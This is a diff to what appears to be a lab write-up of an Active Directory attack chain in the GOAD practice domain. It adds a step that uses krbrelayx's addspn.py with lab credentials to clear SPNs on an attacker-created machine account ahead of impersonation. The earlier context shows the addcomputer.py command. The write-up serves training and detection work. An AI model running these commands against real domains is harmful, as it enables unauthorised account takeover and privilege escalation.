@@ -22,3 +22,12 @@ Command:  addcomputer.py -computer-name 'SYSKEY$' -computer-pass 'Password123!' 
 
 #### Result: Successfully added machine account SYSKEY$ with password Password123!
 <img width="1919" height="152" alt="image" src="https://github.com/user-attachments/assets/deed48d5-0029-4d39-b54a-46b6fc4617c6" />
+
+### 3. Modifying the Attacker Machine Account (T1098)
+The attacker utilized the krbrelayx suite to interact with the Domain Controller (WINTERFELL) and clear the SPNs associated with the recently created SYSKEY$ account.
+
+Command: python3 addspn.py --clear -t 'SYSKEY$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
+
+Action: Successfully connected to the host and cleared the servicePrincipalName attribute for CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local.
+
+Impact: Clearing these attributes ensures that the machine account is in a "clean" state before the attacker attempts to configure it for impersonation against a target service.
